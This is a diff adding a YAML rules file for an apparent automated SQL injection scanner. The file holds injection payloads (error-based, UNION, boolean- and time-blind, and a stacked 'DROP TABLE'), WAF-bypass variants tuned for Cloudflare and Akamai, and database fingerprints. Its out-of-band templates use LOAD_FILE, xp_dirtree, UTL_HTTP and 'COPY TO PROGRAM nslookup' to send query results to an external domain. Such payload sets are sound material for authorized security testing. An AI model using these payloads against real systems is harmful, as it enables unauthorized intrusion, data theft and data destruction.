@@ -1,0 +1,258 @@
+
+# knowledge/rules/sqli_rules.yaml
+# SAM-∞ v28-Ω  SQL Injection Detection Rules
+# ──────────────────────────────────────────────────────────────────────────────
+# 结构说明：
+#   payloads:          静态 payload 列表（初始高质量种子）
+#   waf_bypass:        WAF 绕过变体
+#   oracle_patterns:   差分 echo 验证模式（精确字符串）
+#   oast_templates:    OAST 带外验证 payload 模板
+#   db_fingerprints:   数据库类型指纹
+#   distilled_rules:   DistillationEngine 蒸馏写入区（勿手动修改）
+# ──────────────────────────────────────────────────────────────────────────────
+
+meta:
+  vuln_type: sqli
+  version: "1.0.0"
+  last_updated: "2026-10-27"
+  description: "SQL 注入检测规则集：错误型、布尔盲注、时间盲注、OAST 带外"
+
+# ── 数据库错误型 Oracle 模式（差分 echo，精确字符串匹配）──────────────────────
+oracle_patterns:
+  mysql:
+    - "You have an error in your SQL syntax"
+    - "Warning: mysql_fetch"
+    - "supplied argument is not a valid MySQL result"
+    - "Column count doesn't match value count"
+    - "Unclosed quotation mark after the character string"
+  postgresql:
+    - "PG::SyntaxError"
+    - "unterminated quoted string at or near"
+    - "ERROR:  syntax error at or near"
+    - "pg_query(): Query failed"
+  mssql:
+    - "Unclosed quotation mark after the character string"
+    - "Incorrect syntax near"
+    - "OLE DB provider"
+    - "Microsoft OLE DB Provider for SQL Server"
+  oracle_db:
+    - "ORA-01756"
+    - "ORA-00933"
+    - "ORA-00907"
+    - "quoted string not properly terminated"
+  sqlite:
+    - "SQLite3::Exception"
+    - "SQLiteException"
+    - "unrecognized token"
+  generic:
+    - "syntax error"
+    - "mysql_num_rows"
+    - "Invalid SQL"
+    - "SQL command not properly ended"
+
+default_oracle_pattern: "You have an error in your SQL syntax"
+
+# ── 错误型注入 payloads ───────────────────────────────────────────────────────
+payloads:
+  # 基础引号探测
+  - payload: "'"
+    oracle_pattern: "You have an error in your SQL syntax"
+    category: error_based
+    confidence: 0.85
+
+  - payload: "''"
+    oracle_pattern: "You have an error in your SQL syntax"
+    category: error_based
+    confidence: 0.80
+
+  - payload: "\"'"
+    oracle_pattern: "syntax error"
+    category: error_based
+    confidence: 0.75
+
+  # MySQL 错误型提取
+  - payload: "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -"
+    oracle_pattern: "XPATH syntax error"
+    category: error_based
+    db: mysql
+    confidence: 0.90
+
+  - payload: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -"
+    oracle_pattern: "XPATH syntax error"
+    category: error_based
+    db: mysql
+    confidence: 0.90
+
+  # UNION 型
+  - payload: "' ORDER BY 1-- -"
+    oracle_pattern: ""
+    category: union
+    confidence: 0.70
+
+  - payload: "' UNION SELECT NULL-- -"
+    oracle_pattern: ""
+    category: union
+    confidence: 0.75
+
+  - payload: "' UNION SELECT NULL,NULL-- -"
+    oracle_pattern: ""
+    category: union
+    confidence: 0.75
+
+  - payload: "' UNION SELECT NULL,NULL,NULL-- -"
+    oracle_pattern: ""
+    category: union
+    confidence: 0.75
+
+  - payload: "' UNION SELECT 1,version(),3-- -"
+    oracle_pattern: ""
+    category: union
+    db: mysql
+    confidence: 0.80
+
+  # 布尔盲注
+  - payload: "' AND 1=1-- -"
+    oracle_pattern: ""
+    category: boolean_blind
+    confidence: 0.70
+
+  - payload: "' AND 1=2-- -"
+    oracle_pattern: ""
+    category: boolean_blind
+    confidence: 0.70
+
+  - payload: "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -"
+    oracle_pattern: ""
+    category: boolean_blind
+    confidence: 0.75
+
+  # 时间盲注（MySQL）
+  - payload: "' AND SLEEP(5)-- -"
+    oracle_pattern: ""
+    category: time_blind
+    db: mysql
+    confidence: 0.80
+    time_threshold_ms: 4500
+
+  - payload: "'; WAITFOR DELAY '0:0:5'-- -"
+    oracle_pattern: ""
+    category: time_blind
+    db: mssql
+    confidence: 0.80
+    time_threshold_ms: 4500
+
+  - payload: "'; SELECT pg_sleep(5)-- -"
+    oracle_pattern: ""
+    category: time_blind
+    db: postgresql
+    confidence: 0.80
+    time_threshold_ms: 4500
+
+  # 堆叠注入
+  - payload: "'; DROP TABLE-- -"
+    oracle_pattern: ""
+    category: stacked
+    confidence: 0.65
+    note: "仅探测，不执行危险操作"
+
+# ── WAF Bypass 变体 ────────────────────────────────────────────────────────────
+waf_bypass:
+  # 大小写混淆
+  case_mixing:
+    - "' UnIoN SeLeCt NULL-- -"
+    - "' sElEcT 1,2,3-- -"
+
+  # 内联注释
+  inline_comment:
+    - "' UN/**/ION SE/**/LECT NULL-- -"
+    - "' /*!UNION*/ /*!SELECT*/ NULL-- -"
+    - "'/*!50000 UNION*//*!50000 SELECT*/ NULL-- -"
+
+  # URL 编码
+  url_encoding:
+    - "%27%20UNION%20SELECT%20NULL--%20-"
+    - "%27%20AND%20SLEEP(5)--%20-"
+
+  # 双重 URL 编码
+  double_url_encoding:
+    - "%2527%2520UNION%2520SELECT%2520NULL--%2520-"
+
+  # HTTP 参数污染
+  hpp:
+    - "id=1&id=2 UNION SELECT NULL-- -"
+
+  # 空白字符替换（绕过空格过滤）
+  whitespace_bypass:
+    - "'%09UNION%09SELECT%09NULL-- -"    # Tab
+    - "'%0aUNION%0aSELECT%0aNULL-- -"   # 换行
+    - "'%0dUNION%0dSELECT%0dNULL-- -"   # 回车
+    - "'+UNION+SELECT+NULL-- -"          # 加号
+
+  # 括号绕过
+  parentheses:
+    - "' UNION(SELECT(NULL))-- -"
+    - "' UNION(SELECT(1),(2),(3))-- -"
+
+  # cloudflare 专用
+  cloudflare:
+    - "' /*!UNION*/ /*!SELECT*/ NULL,NULL-- -"
+    - "' AND 0x31=0x31-- -"
+    - "' AND char(49)=char(49)-- -"
+
+  # akamai 专用
+  akamai:
+    - "' UNION%20SELECT%20NULL,NULL-- -"
+    - "' AND%201=1-- -"
+
+# ── OAST 带外注入模板 ─────────────────────────────────────────────────────────
+oast_templates:
+  mysql:
+    dns_lookup:
+      - "' AND LOAD_FILE(CONCAT('\\\\\\\\',({subquery}),'.{oast_domain}','\\\\file'))-- -"
+      - "' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,'{oast_domain}',0x5c5c))-- -"
+    note: "需要 FILE 权限和外网 DNS 解析"
+
+  mssql:
+    dns_lookup:
+      - "'; EXEC master..xp_dirtree '\\\\{oast_domain}\\share'-- -"
+      - "'; EXEC master..xp_fileexist '\\\\{oast_domain}\\share'-- -"
+    note: "需要 xp_dirtree 或 xp_fileexist 存储过程权限"
+
+  oracle_db:
+    http_request:
+      - "' UNION SELECT UTL_HTTP.REQUEST('http://{oast_domain}/{correlation_id}') FROM dual-- -"
+      - "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('{correlation_id}.{oast_domain}') FROM dual-- -"
+
+  postgresql:
+    dns_lookup:
+      - "'; COPY (SELECT '') TO PROGRAM 'nslookup {correlation_id}.{oast_domain}'-- -"
+      - "'; SELECT dblink_send_query('host={oast_domain}','SELECT 1')-- -"
+
+# ── 数据库指纹 ────────────────────────────────────────────────────────────────
+db_fingerprints:
+  mysql:
+    version_query: "SELECT @@version"
+    version_pattern: "\\d+\\.\\d+\\.\\d+-MySQL"
+    error_markers: ["You have an error in your SQL syntax", "mysql_"]
+  postgresql:
+    version_query: "SELECT version()"
+    version_pattern: "PostgreSQL \\d+\\.\\d+"
+    error_markers: ["PG::", "unterminated quoted string"]
+  mssql:
+    version_query: "SELECT @@version"
+    version_pattern: "Microsoft SQL Server"
+    error_markers: ["Incorrect syntax near", "OLE DB"]
+  oracle_db:
+    version_query: "SELECT banner FROM v$version"
+    version_pattern: "Oracle Database"
+    error_markers: ["ORA-\\d{5}"]
+  sqlite:
+    version_query: "SELECT sqlite_version()"
+    version_pattern: "\\d+\\.\\d+\\.\\d+"
+    error_markers: ["SQLite3::", "unrecognized token"]
+
+# ── DistillationEngine 蒸馏写入区 ─────────────────────────────────────────────
+# （以下内容由 DistillationEngine 自动维护，勿手动修改）
+distilled_rules: []
+total_distilled_rules: 0
+last_updated: "2026-10-27"
